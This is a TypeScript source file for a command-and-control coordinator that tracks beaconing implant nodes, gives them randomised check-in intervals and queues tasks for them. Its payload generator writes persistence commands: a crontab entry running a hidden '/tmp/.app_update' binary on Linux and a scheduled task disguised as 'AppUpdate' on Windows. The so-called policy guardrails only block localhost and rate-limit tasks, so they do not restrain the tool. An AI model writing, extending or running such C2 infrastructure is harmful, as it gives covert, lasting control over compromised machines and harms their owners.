import { ethers } from 'ethers';
import { EventEmitter } from 'events';

// C2 Node Representation
interface C2Node {
  id: string;
  address: string;
  lastSeen: number;
  status: 'idle' | 'tasked' | 'offline';
  capabilities: string[];
  os: 'linux' | 'windows' | 'macos' | 'unknown';
}

interface JitterConfig {
  baseInterval: number; // ms
  jitterFactor: number; // 0.0 to 1.0
}

class C2Coordinator extends EventEmitter {
  private nodes: Map<string, C2Node> = new Map();
  private tasks: Map<string, any[]> = new Map();
  private taskHistory: Map<string, number[]> = new Map(); // For POLICY-2
  private jitterConfig: JitterConfig = {
    baseInterval: 30000, // 30 seconds
    jitterFactor: 0.2,   // 20% variance
  };

  // Guardrail: POLICY-1 (Execution Sandbox)
  private restrictedIps = ['127.0.0.1', 'localhost', '0.0.0.0'];

  constructor() {
    super();
    console.log('[C2] Coordinator initialized. POLICY-1 & POLICY-2 Active.');
  }

  /**
   * Actionable Improvement: OS-Specific Payload Generation (s1)
   */
  private generatePayload(os: string, taskId: string): string {
    if (taskId === 's1') {
      if (os === 'linux') {
        return 'echo "[+] Setting persistence via systemd"; (crontab -l 2>/dev/null; echo "*/30 * * * * /tmp/.app_update") | crontab -';
      } else if (os === 'windows') {
        return 'powershell.exe -Command "New-ScheduledTaskAction -Execute \'calc.exe\'; Register-ScheduledTask -Action $action -TaskName \'AppUpdate\'"';
      }
    }
    return 'whoami';
  }

  // Register or update a node via beacon
  registerBeacon(nodeId: string, address: string, capabilities: string[], os: any = 'linux') {
    // Enforcement: Reject beacons from restricted IPs unless authorized
    if (this.restrictedIps.includes(address)) {
      console.warn(`[POLICY-1] Rejected beacon from restricted IP: ${address}`);
      return { status: 'rejected', reason: 'POLICY-1 violation' };
    }

    const node: C2Node = {
      id: nodeId,
      address,
      capabilities,
      os: os as any,
      lastSeen: Date.now(),
      status: this.nodes.get(nodeId)?.status || 'idle',
    };
    
    this.nodes.set(nodeId, node);
    this.emit('beacon', node);
    
    // Check for tasks
    const pendingTasks = this.tasks.get(nodeId) || [];
    this.tasks.delete(nodeId);
    
    // Calculate next jittered interval
    const jitter = (Math.random() - 0.5) * 2 * (this.jitterConfig.baseInterval * this.jitterConfig.jitterFactor);
    const nextInterval = this.jitterConfig.baseInterval + jitter;

    return {
      status: 'acknowledged',
      tasks: pendingTasks,
      nextCheckIn: Math.floor(nextInterval),
    };
  }

  /**
   * Upgraded: s1 with OS-Aware Payloads & POLICY-2 Guardrails
   */
  assignTask(nodeId: string, task: { id: string, payload?: string }) {
    const node = this.nodes.get(nodeId);
    if (!node) return { error: 'Node not found' };

    // Enforcement: POLICY-1 (IP Sandbox)
    if (task.id === 's1' && this.restrictedIps.includes(node.address)) {
       console.error(`[POLICY-1] Blocked s1 execution on restricted target: ${node.address}`);
       return { error: 'POLICY-1 violation' };
    }

    // Enforcement: POLICY-2 (Command Storm Prevention)
    const now = Date.now();
    const history = this.taskHistory.get(nodeId) || [];
    const recentTasks = history.filter(t => now - t < 60000); // last 60 seconds
    
    if (recentTasks.length >= 3) {
      console.warn(`[POLICY-2] Command storm detected on ${nodeId}. Blocking task.`);
      this.emit('policy_violation', { id: 'POLICY-2', nodeId });
      return { error: 'POLICY-2 violation: Rate limit exceeded' };
    }

    // Update history
    recentTasks.push(now);
    this.taskHistory.set(nodeId, recentTasks);

    // Generate OS-specific payload if not provided
    const payload = task.payload || this.generatePayload(node.os, task.id);

    if (!this.tasks.has(nodeId)) {
      this.tasks.set(nodeId, []);
    }
    
    console.log(`[C2] Task ${task.id} (OS: ${node.os}) assigned to ${nodeId}`);
    this.tasks.get(nodeId)?.push({ ...task, payload });
    node.status = 'tasked';
    return { status: 'assigned' };
  }

  getNodes() {
    return Array.from(this.nodes.values());
  }

  // Monitor for offline nodes
  checkHealth() {
    const now = Date.now();
    this.nodes.forEach((node, id) => {
      if (now - node.lastSeen > (this.jitterConfig.baseInterval * 3)) {
        node.status = 'offline';
        this.emit('node_offline', node);
      }
    });
  }
}

export const coordinator = new C2Coordinator();

// Periodically check health
setInterval(() => coordinator.checkHealth(), 10000);
